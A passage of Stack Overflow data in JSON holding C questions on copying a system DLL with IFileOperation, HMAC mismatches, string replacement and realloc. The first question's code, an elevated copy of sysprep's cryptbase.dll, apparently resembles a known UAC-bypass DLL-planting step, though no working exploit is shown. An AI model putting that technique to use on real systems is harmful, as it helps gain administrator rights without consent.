"https://www.gravatar.com/avatar/1fd5f5cc203c393634379a3b3b7e7a87?s=128&d=identicon&r=PG", "display_name": "Anders", "link": "https://stackoverflow.com/users/3501/anders"}, "is_accepted": true, "score": 3, "last_activity_date": 1518606738, "last_edit_date": 1518606738, "creation_date": 1518605066, "answer_id": 48785197, "question_id": 48783508, "link": "https://stackoverflow.com/questions/48783508/shcreateitemfromparsingname-return-file-not-found-when-filename-specified/48785197#48785197", "title": "SHCreateItemFromParsingName return FILE_NOT_FOUND when filename specified", "body": "<p>Assuming your application is compiled as a 32-bit application and running on a 64-bit OS, a file not found error is probably correct because your application is redirected to the 32-bit system directory (<code>%WinDir%\\SysWoW64</code>).</p>\n\n<blockquote>\n  <p>In most cases, whenever a 32-bit application attempts to access %windir%\\System32, %windir%\\lastgood\\system32, or %windir%\\regedit.exe, the access is redirected to an architecture-specific path.</p>\n</blockquote>\n\n<p>For more information, see <a href=\"https://msdn.microsoft.com/en-us/library/windows/desktop/aa384187(v=vs.85).aspx\" rel=\"nofollow noreferrer\">File System Redirector</a> on MSDN.</p>\n\n<p>You could temporarily turn off redirection in your thread but it is not really safe to do this when calling shell functions, only functions in kernel32. If the API you are calling internally uses <code>LoadLibrary</code> and/or COM then the API might fail because it will be unable to load from system32 while redirection is disabled. </p>\n\n<p>You can also access the native system32 directory with the <code>%WinDir%\\SysNative</code> backdoor. This only works in 32-bit applications on 64-bit Vista+ so you must do some version detection.</p>\n"}], "owner": {"reputation": 1055, "user_id": 3212675, "user_type": "registered", "accept_rate": 77, "profile_image": "https://graph.facebook.com/100002346744735/picture?type=large", "display_name": "murzagurskiy", "link": "https://stackoverflow.com/users/3212675/murzagurskiy"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 453, "favorite_count": 0, "accepted_answer_id": 48785197, "answer_count": 1, "score": 0, "last_activity_date": 1518606738, "creation_date": 1518600060, "question_id": 48783508, "link": "https://stackoverflow.com/questions/48783508/shcreateitemfromparsingname-return-file-not-found-when-filename-specified", "title": "SHCreateItemFromParsingName return FILE_NOT_FOUND when filename specified", "body": "<p>I try get IShellItem for a file to copy it with IFileOperation COM interface from system directory to another directory. I must use exactly IFileOperation COM interface for this purpose.</p>\n\n<p>When I specify full filename - return value from <code>SHCreateItemFromParsingName()</code> was <code>ERROR_FILE_NOT_FOUND</code>, but file present in the directory. When I delete filename from path below and use only folder path - all seems good, return value is <code>S_OK</code>.</p>\n\n<pre><code>//...\nCoInitialize(NULL);\n//...\nWCHAR szSourceDll[MAX_PATH * 2];\nwcscpy_s(szSourceDll, MAX_PATH, L\"C:\\\\Windows\\\\System32\\\\sysprep\\\\cryptbase.dll\");\nr = CoCreateInstance(&amp;CLSID_FileOperation, NULL, CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER, &amp;IID_IFileOperation, &amp;FileOperation1);\nif (r != S_OK) return;\nFileOperation1-&gt;lpVtbl-&gt;SetOperationFlags(FileOperation1, FOF_NOCONFIRMATION | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION);\nr = SHCreateItemFromParsingName(szSourceDll, NULL, &amp;IID_IShellItem, &amp;isrc);\n//...\nCoUninitialize();\n//...\n</code></pre>\n\n<p>Why this code, written in <code>C</code>, not working with filenames. How can I create <code>IShellItem</code> instance for file in system folder to copy it?</p>\n\n<p><strong>P.S.</strong></p>\n\n<p>Windows 7 x64, C, Visual Studio 2015, v140 platform toolset, additional dependencies: <em>Msi.lib;Wuguid.lib;ole32.lib;ntdll.lib</em></p>\n\n<p><strong>P.P.S</strong></p>\n\n<p>It's properly work with files in user`s directories...</p>\n"}, {"tags": ["c", "openssl"], "comments": [{"owner": {"reputation": 82953, "user_id": 608639, "user_type": "registered", "accept_rate": 64, "profile_image": "https://i.stack.imgur.com/aPIhh.jpg?s=128&g=1", "display_name": "jww", "link": "https://stackoverflow.com/users/608639/jww"}, "edited": false, "score": 0, "creation_date": 1518659023, "post_id": 48783478, "comment_id": 84600540, "body": "Please show your code, including your server code. Since Stack Overflow hides the Close reason from you: <i>Questions seeking debugging help (&quot;why isn&#39;t this code working?&quot;) must include the desired behavior, a specific problem or error and the shortest code necessary to reproduce it in the question itself. Questions without a clear problem statement are not useful to other readers. See: <a href=\"http://stackoverflow.com/help/mcve\">How to create a Minimal, Complete, and Verifiable example</a>.</i>"}, {"owner": {"reputation": 696, "user_id": 2129644, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/8feb0a34801725042b245cd1158fda48?s=128&d=identicon&r=PG", "display_name": "Olof", "link": "https://stackoverflow.com/users/2129644/olof"}, "reply_to_user": {"reputation": 82953, "user_id": 608639, "user_type": "registered", "accept_rate": 64, "profile_image": "https://i.stack.imgur.com/aPIhh.jpg?s=128&g=1", "display_name": "jww", "link": "https://stackoverflow.com/users/608639/jww"}, "edited": false, "score": 0, "creation_date": 1518697447, "post_id": 48783478, "comment_id": 84617113, "body": "So gave some more code"}], "answers": [{"tags": [], "owner": {"reputation": 7882, "user_id": 2722968, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/d0a9ce812892f03b8342c5a60be24632?s=128&d=identicon&r=PG&f=1", "display_name": "user2722968", "link": "https://stackoverflow.com/users/2722968/user2722968"}, "is_accepted": true, "score": 1, "last_activity_date": 1518698236, "creation_date": 1518698236, "answer_id": 48807485, "question_id": 48783478, "link": "https://stackoverflow.com/questions/48783478/openssl-hmac-generates-different-result/48807485#48807485", "title": "Openssl hmac generates different result", "body": "<p>Your C implementation is incorrect with respect to <code>package_size</code>, which you hardcoded at 100 bytes. You effectively use the message <code>{\"alg\":\"SHA256\",\"id\":1,\"data\":\"DOGOOS\",\"time\":3,\"expire\":1}\\x00\\x00\\x00\\x00...\\x00</code> in your C-implementation while your rust-code uses the correct message.</p>\n\n<p>Demonstrated in python:</p>\n\n<pre><code>&gt;&gt;&gt; import hashlib\n&gt;&gt;&gt; import hmac\n&gt;&gt;&gt; import base64\n&gt;&gt;&gt; correct_msg = b'{\"alg\":\"SHA256\",\"id\":1,\"data\":\"DOGOOS\",\"time\":3,\"expire\":1}'\n&gt;&gt;&gt; badly_padded_msg = correct_msg + b'\\x00'*(100-len(msg))\n&gt;&gt;&gt; key = b'Secret and secure key!';\n&gt;&gt;&gt; base64.encodebytes(hmac.HMAC(key, correct_msg, hashlib.sha256).digest())\nb'6DE3KUbbF6nKttaKIWRQaKAgdA7gG1JiPU63L1uPOww=\\n'\n&gt;&gt;&gt; base64.encodebytes(hmac.HMAC(key, badly_padded_msg, hashlib.sha256).digest())\nb'egL2gFU2DZVNkTk7jzhl7YJOKhHOWqTh/pUi3G2G2C4=\\n'\n</code></pre>\n"}], "owner": {"reputation": 696, "user_id": 2129644, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/8feb0a34801725042b245cd1158fda48?s=128&d=identicon&r=PG", "display_name": "Olof", "link": "https://stackoverflow.com/users/2129644/olof"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 438, "favorite_count": 0, "accepted_answer_id": 48807485, "answer_count": 1, "score": 0, "last_activity_date": 1518698236, "creation_date": 1518599950, "last_edit_date": 1518698144, "question_id": 48783478, "link": "https://stackoverflow.com/questions/48783478/openssl-hmac-generates-different-result", "title": "Openssl hmac generates different result", "body": "<p>I am working on library that HMAC input to get a signature, the signature will then be checked on the server to validated the sender. My problem is that the library and server generates different HMAC. I use the HMAC function provided by the OpenSSL package.</p>\n\n<p>The key is <code>Secret and secure key!</code> and the package (data) is <code>{\"alg\":\"SHA256\",\"id\":1,\"data\":\"DOGOOS\",\"time\":3,\"expire\":1}</code> and it generates the following signature <code>egL2gFU2DZVNkTk7jzhl7YJOKhHOWqTh/pUi3G2G2C4=</code> while my server generates <code>6DE3KUbbF6nKttaKIWRQaKAgdA7gG1JiPU63L1uPOww=</code> for the same data.</p>\n\n<p>I also tested to generate a signature from this website <a href=\"https://www.liavaag.org/English/SHA-Generator/HMAC/\" rel=\"nofollow noreferrer\">https://www.liavaag.org/English/SHA-Generator/HMAC/</a> with the following settings and it yields the same result as my server.</p>\n\n<pre><code>Input type: Text\nKey type: Text \nSha variant: SHA256\nOutput type: Base64\n</code></pre>\n\n<p>I have verified that the Base64Encode function works properly.</p>\n\n<pre><code>unsigned char* sign(char* package, int package_len, char* key, int key_len, unsigned char* signature, unsigned int *signature_len, char** b64){\n    HMAC(EVP_sha256(), key, key_len, package, package_len, signature, signature_len);\n\n    Base64Encode(signature, *signature_len, b64);\n    return 0;\n}\n\nint main(int argc, const char * argv[]) {\n\n    int average = 3;\n    uint package_size = 100;\n    uint id = 1;\n    char *package = (char*)malloc(package_size * sizeof(char));\n    char *data = \"DOGOOS\";\n    format(&amp;package, package_size, data, SHA256, id, average, 1);\n\n    unsigned char* key = \"Secret and secure key!\";\n    int key_len = 22;\n    uint signature_len = 200;\n    char* signature = (char*)malloc(signature_len * sizeof(char));\n    char* base64_output;\n\n    unsigned char* output = sign(package, package_size, key, key_len, signature, &amp;signature_len, &amp;base64_output);\n    printf(\"package: %s\\n\", package);\n    printf(\"SIGNATURE: %s\\n\", base64_output);\n\n\n    free(base64_output);\n    free(signature);\n    free(output);\n    free(package);\n    return 0;\n}\n</code></pre>\n\n<p>As requested this is the code on the server side. It is written in rust. I generates the same result as the websites I trired so for all tests I have done the server yields the correct output.</p>\n\n<pre><code>#[derive(Debug, Clone, Copy)]\npub enum Algorithm {\n    SHA256,\n    SHA512,\n}\n\npub struct Packet{\n\n    algorithm:      types::Algorithm,\n    payload:        String,\n    signature:      Vec&lt;u8&gt;,\n    start_time:     u64,\n    timestamp:      u64,\n    expire:         u64,\n}\nimpl Packet {\n    /**\n     * Returns the algorithm used.\n     */\n    pub fn get_algorithm(&amp;self) -&gt; types::Algorithm {\n        self.algorithm.clone()\n    }\n    /**\n     * Returns the signature.\n     */\n    pub fn get_signature(&amp;self) -&gt; &amp;Vec&lt;u8&gt; {\n        &amp;self.signature\n    }\n\n    pub fn get_payload(&amp;self) -&gt; String {\n        self.payload.clone()\n    }\n}\n\n/**\n * Validates the signature of the packet\n */\nfn validate_packet(packet: &amp;packet::Packet, key: &amp;str) -&gt; bool{\n\n    let result = match packet.get_algorithm(){\n        packet::types::Algorithm::SHA256 =&gt; {\n            let mut mac = Hmac::&lt;Sha256&gt;::new(key.as_bytes());\n            mac.input(packet.get_payload().as_bytes());\n            let signature = packet.get_signature();\n            mac.verify(signature)\n        },\n        packet::types::Algorithm::SHA512 =&gt; {\n            let mut mac = Hmac::&lt;Sha512&gt;::new(key.as_bytes());\n            mac.input(packet.get_payload().as_bytes());\n            let signature = packet.get_signature();\n            mac.verify(signature)\n        },\n    };\n\n    return result;\n} \n</code></pre>\n"}, {"tags": ["c", "string"], "comments": [{"owner": {"reputation": 1725, "user_id": 6524169, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/1XpWT.png?s=128&g=1", "display_name": "Aditya", "link": "https://stackoverflow.com/users/6524169/aditya"}, "edited": false, "score": 3, "creation_date": 1518596106, "post_id": 48782464, "comment_id": 84566139, "body": "Space isn&#39;t \\n?"}, {"owner": {"reputation": 786, "user_id": 2768231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/28d005c3867addfdb49c7f7b07619a44?s=128&d=identicon&r=PG&f=1", "display_name": "Stefan M", "link": "https://stackoverflow.com/users/2768231/stefan-m"}, "edited": false, "score": 0, "creation_date": 1518596172, "post_id": 48782464, "comment_id": 84566178, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/779875/what-is-the-function-to-replace-string-in-c\">What is the function to replace string in C?</a>"}, {"owner": {"reputation": 64049, "user_id": 812912, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/732c48dee9ac15216258118fb8c0a764?s=128&d=identicon&r=PG", "display_name": "Ivaylo Strandjev", "link": "https://stackoverflow.com/users/812912/ivaylo-strandjev"}, "edited": false, "score": 2, "creation_date": 1518596197, "post_id": 48782464, "comment_id": 84566190, "body": "@alondavidi <code>\\n</code> is newline not space"}, {"owner": {"reputation": 119882, "user_id": 3545273, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/RDWxl.png?s=128&g=1", "display_name": "Serge Ballesta", "link": "https://stackoverflow.com/users/3545273/serge-ballesta"}, "edited": false, "score": 2, "creation_date": 1518596773, "post_id": 48782464, "comment_id": 84566453, "body": "And the question is?"}, {"owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 0, "creation_date": 1518597214, "post_id": 48782464, "comment_id": 84566660, "body": "You say you want <code>\\n</code> but your sample output uses ` `. Please decide what you want and don&#39;t mix different things."}, {"owner": {"reputation": 51, "user_id": 8522538, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/ce4b8e32192b738a3d8d25ad755fd2f4?s=128&d=identicon&r=PG&f=1", "display_name": "alon davidi", "link": "https://stackoverflow.com/users/8522538/alon-davidi"}, "edited": false, "score": 0, "creation_date": 1518597357, "post_id": 48782464, "comment_id": 84566738, "body": "I need space sorry"}, {"owner": {"reputation": 119882, "user_id": 3545273, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/RDWxl.png?s=128&g=1", "display_name": "Serge Ballesta", "link": "https://stackoverflow.com/users/3545273/serge-ballesta"}, "edited": false, "score": 0, "creation_date": 1518599796, "post_id": 48782464, "comment_id": 84568258, "body": "Do you want to replace each char of the small word with a space, of the whole small word with a single space?"}, {"owner": {"reputation": 51, "user_id": 8522538, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/ce4b8e32192b738a3d8d25ad755fd2f4?s=128&d=identicon&r=PG&f=1", "display_name": "alon davidi", "link": "https://stackoverflow.com/users/8522538/alon-davidi"}, "reply_to_user": {"reputation": 119882, "user_id": 3545273, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/RDWxl.png?s=128&g=1", "display_name": "Serge Ballesta", "link": "https://stackoverflow.com/users/3545273/serge-ballesta"}, "edited": false, "score": 0, "creation_date": 1518600607, "post_id": 48782464, "comment_id": 84568832, "body": "@SergeBallesta the whole small word"}], "answers": [{"comments": [{"owner": {"reputation": 51, "user_id": 8522538, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/ce4b8e32192b738a3d8d25ad755fd2f4?s=128&d=identicon&r=PG&f=1", "display_name": "alon davidi", "link": "https://stackoverflow.com/users/8522538/alon-davidi"}, "edited": false, "score": 0, "creation_date": 1518601872, "post_id": 48783692, "comment_id": 84569594, "body": "Thank you very much my friend you helped me a lot"}], "tags": [], "owner": {"reputation": 254, "user_id": 7900415, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/30ca663ac16eb544e183136a7766e29f?s=128&d=identicon&r=PG&f=1", "display_name": "Yohboy", "link": "https://stackoverflow.com/users/7900415/yohboy"}, "is_accepted": true, "score": 0, "last_activity_date": 1518600583, "creation_date": 1518600583, "answer_id": 48783692, "question_id": 48782464, "link": "https://stackoverflow.com/questions/48782464/c-string-put-if-a-word-found-in-the-sentence/48783692#48783692", "title": "c string: put &#39; &#39; if a word found in the sentence", "body": "<p>First of all, in your exemple you work with newline '\\n' and not with space.<br>\nConsider this simple example: </p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#define S 8\n#define B 50\nvoid main() {\n    char small[S] = {\"ol\"};\n    char big[B] = {\"my older gradmom see my older sister\"};\n    int i = 0, j = 0;\n    int cpt = 0;\n    int smallSize = 0; \n\n    // loop to retrieve smallSize\n    for (i = 0; i &lt; S; i++)\n    {\n        if (small[i] != '\\0')\n            smallSize++;\n    }\n\n    // main loop\n    for (i = 0; i &lt; B; i++)\n    {\n        // stop if we hit the end of the string\n        if (big[i] == '\\0')\n            break;\n        // increment the cpt and small index while the content of big and small are equal\n        if (big[i] == small[j])\n        {\n            cpt++;\n            j++;\n        }\n        // we didn't found the full small word\n        else\n        {\n            j = 0;\n            cpt = 0;\n        }\n\n        // test if we found the full word, if yes replace char in big by space\n        if (cpt == smallSize)\n        {\n            for (int k = 0; k &lt; smallSize; k++)\n            {\n                big[i-k] = ' ';\n            }\n            j = 0;\n            cpt = 0;\n        }   \n    }\n\n    puts(big);\n}\n</code></pre>\n\n<p>You need first to retrieve the real size of the small array.<br>\nOnce done, next step is to look inside \"big\" if there is the word small inside. If we find it, then replace all those char by spaces.</p>\n\n<p>If you want to replace the whole small word with a single space, then you'll need to adapt this example ! </p>\n\n<p>I hope this help !</p>\n"}, {"tags": [], "owner": {"reputation": 119882, "user_id": 3545273, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/RDWxl.png?s=128&g=1", "display_name": "Serge Ballesta", "link": "https://stackoverflow.com/users/3545273/serge-ballesta"}, "is_accepted": false, "score": 0, "last_activity_date": 1518602345, "creation_date": 1518602345, "answer_id": 48784258, "question_id": 48782464, "link": "https://stackoverflow.com/questions/48782464/c-string-put-if-a-word-found-in-the-sentence/48784258#48784258", "title": "c string: put &#39; &#39; if a word found in the sentence", "body": "<p>A possible way is to use to pointers to the <code>string</code>, one for reading and one for writing. This will allow to replace an arbitrary number of chars (the ones from <code>small</code>) with a single space. And you do not really want to nest loops but une only one to process every char from <code>big</code>.</p>\n\n<p>Last but not least, <code>void main()</code> should never be used except in stand alone environment (kernel or embedded development). Code could become:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#define S 8\n#define B 50\n\nint main() {                     // void main is deprecated...\nchar small[S] = {\"ol\"};\nchar big[B] = {\"my older gradmom see my older sister\"};\nint i = 0, j = 0;\nint k = 0;    // pointer to written back big\n\nfor (i = 0; i &lt; B; i++)\n{\n    if (big[i] == 0) break;       // do not process beyond end of string\n    if(small[j]!=big[i])\n    {\n        for(int l=0; l&lt;j; l++) big[k++] = small[l];  // copy an eventual partial small\n        big[k++] = big[i];    // copy the incoming character\n        j=0;                  // reset pointer to small\n        continue;\n    }\n    else if(small[++j] == 0)  // reached end of small\n    {\n        big[k++] = ' ';       // replace chars from small with a single space\n        j = 0;                // reset pointer to small\n    }\n}\nbig[k] = '\\0';\nputs(big);\nreturn 0;\n}\n</code></pre>\n\n<p>or even better (no need for fixed sizes of strings):</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main() {                     // void main is deprecated...\nchar small[] = {\"ol\"};\nchar big[] = {\"my older gradmom see my older sister\"};\nint i = 0, j = 0;\nint k = 0;    // pointer to written back big\n\nfor (i = 0; i &lt; sizeof(big); i++)\n{\n    if(small[j]!=big[i])\n...\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 16645, "user_id": 402322, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/GWEWt.gif?s=128&g=1", "display_name": "ceving", "link": "https://stackoverflow.com/users/402322/ceving"}, "is_accepted": false, "score": 0, "last_activity_date": 1518606321, "creation_date": 1518606321, "answer_id": 48785653, "question_id": 48782464, "link": "https://stackoverflow.com/questions/48782464/c-string-put-if-a-word-found-in-the-sentence/48785653#48785653", "title": "c string: put &#39; &#39; if a word found in the sentence", "body": "<p>In C strings are terminated with a null character '\\0'.  Your code defines a somehow random number at the beginning (<code>B</code> and <code>S</code>) and iterates over that much characters instead of the exact number of characters, the strings actually contain. You can use the fact that the string is terminated by testing the content of the string in a <code>while</code> loop.</p>\n\n<pre><code>i = 0;\nwhile (str[i]) {\n  ...\n  i = i + 1;\n}\n</code></pre>\n\n<p>If you prefer <code>for</code> loops you can write it also as a <code>for</code> loop.</p>\n\n<pre><code>for (i = 0; str[i]; i++) {\n  ...\n}\n</code></pre>\n\n<p>Your code does not move the contents of the remaining string to the left. If you replace two characters <code>ol</code> with one character <code></code>, you have to move the remaining characters to the left by one character. Otherwise you would have a hole in the string.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n  char small[] = \"ol\";\n  char big[] = \"my older gradmom see my older sister\";\n  int s; // index, which loops through the small string\n  int b; // index, which loops through the big string\n  int m; // index, which loops through the characters to be modified\n\n  // The following loops through the big string up to the terminating\n  // null character in the big string.\n  b = 0;\n  while (big[b]) {\n    // The following loops through the small string up to the\n    // terminating null character, if the character in the small\n    // string matches the corresponding character in the big string.\n    s = 0;\n    while (small[s] &amp;&amp; big[b+s] == small[s]) {\n      // In case of a match, continue with the next character in the\n      // small string.\n      s = s + 1;\n    }\n    // If we are at the end of the small string, we found in the\n    // big string.\n    if (small[s] == '\\0') {\n      // Now we have to modify the big string.  The modification\n      // starts at the current position in the big string.\n      m = b;\n      // First we have to put the space at the current position in the\n      // big string.\n      big[m] = ' ';\n      // And next the rest of the big string has to be moved left. The\n      // rest of the big string starts, where the match has ended.\n      while (big[b+s]) {\n        m = m + 1;\n        big[m] = big[b+s];\n        s = s + 1;\n      }\n      // Finally the big string has to be terminated by a null\n      // character.\n      big[m+1] = '\\0';\n    }\n    // Continue at next character in big string.\n    b = b + 1;\n  }\n  puts(big);\n  return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 51, "user_id": 8522538, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/ce4b8e32192b738a3d8d25ad755fd2f4?s=128&d=identicon&r=PG&f=1", "display_name": "alon davidi", "link": "https://stackoverflow.com/users/8522538/alon-davidi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 98, "favorite_count": 0, "accepted_answer_id": 48783692, "answer_count": 3, "score": 0, "last_activity_date": 1518606321, "creation_date": 1518596034, "last_edit_date": 1518604300, "question_id": 48782464, "link": "https://stackoverflow.com/questions/48782464/c-string-put-if-a-word-found-in-the-sentence", "title": "c string: put &#39; &#39; if a word found in the sentence", "body": "<p>I made a code and my target is to put spacewhere the input word was found in a sentence. \ni neet to replece the small word with space</p>\n\n<p>like:</p>\n\n<pre><code>Three witches watched three watches\ntch\n</code></pre>\n\n<p>output:</p>\n\n<pre><code>Three wi es wa ed three wa es\n</code></pre>\n\n<p>I made this code:</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#define S 8\n#define B 50\nvoid main() {\nchar small[S] = {\"ol\"};\nchar big[B] = {\"my older gradmom see my older sister\"};\nint i = 0, j = 0;\n\n\nfor (i = 0; i &lt; B; i++)\n{\n    for(j=0;j&lt;S;j++)\n    {\n        if(small[j]!=big[i])\n        {\n            j=0;\n            break;\n        }\n        if(small[j]=='\\0')\n        {\n            while (i-(j-1)!=i)\n            {\n                i = i - j;\n                big[i] = '\\n';\n                i++;\n            }\n        }\n    }\n}\nputs(big);\n}\n</code></pre>\n"}, {"tags": ["c", "pointers", "malloc", "dynamic-memory-allocation", "realloc"], "comments": [{"owner": {"reputation": 64049, "user_id": 812912, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/732c48dee9ac15216258118fb8c0a764?s=128&d=identicon&r=PG", "display_name": "Ivaylo Strandjev", "link": "https://stackoverflow.com/users/812912/ivaylo-strandjev"}, "edited": false, "score": 1, "creation_date": 1518594843, "post_id": 48782089, "comment_id": 84565558, "body": "have a look at this question: <a href=\"https://stackoverflow.com/q/605845/812912\">stackoverflow.com/q/605845/812912</a>"}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 0, "creation_date": 1518595015, "post_id": 48782089, "comment_id": 84565642, "body": "<code>indexOfCabin = &amp;i</code> throws away the memory you allocated, and puts the address of <code>i</code> into the pointer."}, {"owner": {"reputation": 64049, "user_id": 812912, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/732c48dee9ac15216258118fb8c0a764?s=128&d=identicon&r=PG", "display_name": "Ivaylo Strandjev", "link": "https://stackoverflow.com/users/812912/ivaylo-strandjev"}, "reply_to_user": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 1, "creation_date": 1518595135, "post_id": 48782089, "comment_id": 84565702, "body": "@user3386109 actually realloc takes care of freeing the old memory if needed: <a href=\"http://en.cppreference.com/w/c/memory/realloc\" rel=\"nofollow noreferrer\">en.cppreference.com/w/c/memory/realloc</a>"}, {"owner": {"reputation": 278, "user_id": 5470770, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/e3348aa561631114656f1e7d0488bcac?s=128&d=identicon&r=PG&f=1", "display_name": "anderssinho", "link": "https://stackoverflow.com/users/5470770/anderssinho"}, "reply_to_user": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 0, "creation_date": 1518595155, "post_id": 48782089, "comment_id": 84565708, "body": "@user3386109 ah that&#39;s completely true now that you point it out. How do I instead store the index eg. 17 in indexOfCabin?"}, {"owner": {"reputation": 64049, "user_id": 812912, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/732c48dee9ac15216258118fb8c0a764?s=128&d=identicon&r=PG", "display_name": "Ivaylo Strandjev", "link": "https://stackoverflow.com/users/812912/ivaylo-strandjev"}, "edited": false, "score": 2, "creation_date": 1518595198, "post_id": 48782089, "comment_id": 84565729, "body": "@anderssinho please read the documentation of realloc. The statement is not true"}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 1, "creation_date": 1518595344, "post_id": 48782089, "comment_id": 84565789, "body": "<code>indexOfCabin</code> can be used like an array, e.g. <code>indexOfCabin[counter] = i;</code>. But <code>counter</code> needs to start at 0, and should be incremented after being used. And <code>indexOfCabin</code> should not be incremented."}, {"owner": {"reputation": 278, "user_id": 5470770, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/e3348aa561631114656f1e7d0488bcac?s=128&d=identicon&r=PG&f=1", "display_name": "anderssinho", "link": "https://stackoverflow.com/users/5470770/anderssinho"}, "reply_to_user": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 1, "creation_date": 1518595429, "post_id": 48782089, "comment_id": 84565828, "body": "@user3386109 ah ofc. I&#39;ll try that and comeback if there is any problem. Thanks"}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1518601402, "post_id": 48782089, "comment_id": 84569322, "body": "Hint (not directly related to your question but it might make your life easier): you should outsource the memory management to another function instead of mixing memory management and program logic in the same function."}, {"owner": {"reputation": 278, "user_id": 5470770, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/e3348aa561631114656f1e7d0488bcac?s=128&d=identicon&r=PG&f=1", "display_name": "anderssinho", "link": "https://stackoverflow.com/users/5470770/anderssinho"}, "reply_to_user": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1518604247, "post_id": 48782089, "comment_id": 84571179, "body": "@MichaelWalz that&#39;s is also a good tips. Will break out that part in a function of it&#39;s own to make the coder easier to understand :)"}], "answers": [{"comments": [{"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 4, "creation_date": 1518599522, "post_id": 48782531, "comment_id": 84568056, "body": "You should <i>never</i> <code>realloc</code> the pointer itself (e.g. <code>indexOfCabin = realloc(indexOfCabin,...</code>, you should use a temporary pointer <code>void *tmp = realloc(indexOfCabin,...</code>, then check <code>if (tmp)</code> to validate the reallocation before assigning <code>indexOfCabin=tmp;</code>. Otherwise if <code>realloc</code> fails you overwrite your original pointer address with <code>NULL</code> causing a memory leak."}, {"owner": {"reputation": 278, "user_id": 5470770, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/e3348aa561631114656f1e7d0488bcac?s=128&d=identicon&r=PG&f=1", "display_name": "anderssinho", "link": "https://stackoverflow.com/users/5470770/anderssinho"}, "reply_to_user": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1518599591, 